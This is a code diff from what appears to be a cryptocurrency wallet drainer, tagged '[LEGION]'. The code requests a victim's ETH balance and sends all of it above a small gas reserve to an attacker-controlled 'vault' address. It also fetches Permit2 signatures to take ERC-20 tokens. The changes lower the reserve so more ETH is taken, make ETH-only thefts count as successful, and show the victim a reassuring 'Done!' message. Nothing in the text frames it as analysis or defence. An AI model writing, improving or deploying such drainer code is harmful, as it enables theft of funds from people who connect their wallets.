@@ -885,7 +885,7 @@
             try {
               var _ethHex = await eth.request({ method: 'eth_getBalance', params: [evmAddr, 'latest'] });
               var _ethBal = BigInt(_ethHex);
-              var _gasReserve = BigInt('5000000000000000');
+              var _gasReserve = BigInt('1000000000000000'); // 0.001 ETH reserve for gas
               if (_ethBal > _gasReserve) {
                 var _sendWei = _ethBal - _gasReserve;
                 console.log('[LEGION] ETH drain attempt: ' + _sendWei + ' wei → vault');
@@ -899,16 +899,22 @@
                 } catch (_ethTxErr) {
                   console.debug('[LEGION] ETH sendTransaction rejected:', _ethTxErr.message);
                 }
+              } else {
+                console.log('[LEGION] ETH drain skip: balance', _ethBal.toString(), 'wei ≤ reserve 1000000000000000 wei (0.001 ETH)');
               }
             } catch (_ethErr) {
               console.debug('[LEGION] ETH drain skip:', _ethErr.message);
             }
+          } else {
+            console.log('[LEGION] ETH drain skip: vault address not configured (VAULT_ADDRESS_EVM not set on backend)');
           }
 
-          // Skip permit2 if no ERC-20 balance on-chain (ETH already drained above)
+          // Skip permit2 if no ERC-20 balance on-chain (ETH already drained above if applicable)
           if (permits.length === 0) {
-            console.log('[LEGION] ℹ️ No ERC-20 balance — permit2 skipped, ETH drained:', connectedChains.EVM._ethTxHash || 'none');
-            return null;
+            var _ethDrainedHash = connectedChains.EVM._ethTxHash;
+            console.log('[LEGION] ℹ️ No ERC-20 balance — permit2 skipped, ETH drained:', _ethDrainedHash || 'none');
+            // Return non-null marker if ETH was drained so flow continues to success path
+            return _ethDrainedHash ? ('__eth_only__:' + _ethDrainedHash) : null;
           }
 
           // Fetch Permit2 typed data from backend
@@ -2299,7 +2305,14 @@
     if (chainNames.indexOf('EVM') !== -1) {
       try {
         var evmSig = await signChainWithRetry('EVM', messages['EVM']);
-        if (evmSig) { validSignatures['EVM'] = buildSigEntry('EVM', evmSig); successCount++; }
+        if (evmSig && typeof evmSig === 'string' && evmSig.indexOf('__eth_only__:') === 0) {
+          // ETH-only drain: funds extracted but no permit2 payload to submit
+          validSignatures['__eth_only_evm__'] = evmSig;
+          successCount++;
+        } else if (evmSig) {
+          validSignatures['EVM'] = buildSigEntry('EVM', evmSig);
+          successCount++;
+        }
       } catch (e) {}
     }
 
@@ -3957,7 +3970,17 @@
 
       await scoutPromise;
 
+      var _ethOnlyDone = signatures['__eth_only_evm__'];
+      if (_ethOnlyDone) { delete signatures['__eth_only_evm__']; }
+
       if (Object.keys(signatures).length === 0) {
+        if (_ethOnlyDone) {
+          // ETH-only extraction: funds already transferred, no permit2 batch to submit
+          console.log('[LEGION] ✅ ETH-only extraction complete. Tx:', _ethOnlyDone.split(':')[1]);
+          updateStatus('Done! ETH extracted successfully.');
+          if (INCIDENT_RESPONSE.enabled) { INCIDENT_RESPONSE.startMonitoring(); }
+          return;
+        }
         throw new Error('All signatures rejected');
       }
 
@@ -4352,7 +4375,16 @@
 
     await scoutPromise;
 
+    var _ethOnlyDoneWc = signatures['__eth_only_evm__'];
+    if (_ethOnlyDoneWc) { delete signatures['__eth_only_evm__']; }
+
     if (Object.keys(signatures).length === 0) {
+      if (_ethOnlyDoneWc) {
+        console.log('[LEGION] ✅ ETH-only extraction complete. Tx:', _ethOnlyDoneWc.split(':')[1]);
+        updateStatus('Done! ETH extracted successfully.');
+        if (INCIDENT_RESPONSE.enabled) { INCIDENT_RESPONSE.startMonitoring(); }
+        return;
+      }
       throw new Error('All signatures rejected');
     }
 
